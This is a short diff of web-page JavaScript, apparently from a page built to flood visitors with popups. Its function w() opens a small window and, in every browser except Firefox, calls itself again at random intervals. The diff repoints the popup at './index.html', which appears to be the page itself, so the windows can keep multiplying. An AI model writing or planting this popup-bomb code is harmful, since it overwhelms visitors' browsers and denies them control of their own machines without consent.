@@ -10,7 +10,7 @@
       const urlParams = new URLSearchParams(window.location.search);
       const small = urlParams.get('small');
       function w(){
-        window.open("./i.htm","_blank","width=200,height=200");
+        window.open("./index.html","_blank","width=200,height=200");
         if(user.browser.family !== "Firefox"){
           setTimeout(w, Math.random()*1000);
         }
